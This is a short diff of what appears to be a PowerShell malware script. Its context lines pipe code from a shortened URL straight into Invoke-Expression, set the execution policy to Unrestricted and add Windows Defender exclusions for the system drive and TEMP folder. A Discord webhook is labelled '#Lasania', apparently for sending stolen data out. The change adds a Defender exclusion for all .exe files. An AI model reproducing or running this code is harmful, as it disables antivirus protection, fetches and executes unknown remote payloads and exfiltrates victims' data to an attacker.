@@ -26,7 +26,7 @@ Start-Sleep -Seconds 5;
 irm https://rb.gy/xzpj1d | iex;
 
 #Exclusions
-Set-ExecutionPolicy Unrestricted -Force;  Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP;
+Set-ExecutionPolicy Unrestricted -Force;  Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe";
 
 #Lasania
 $webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
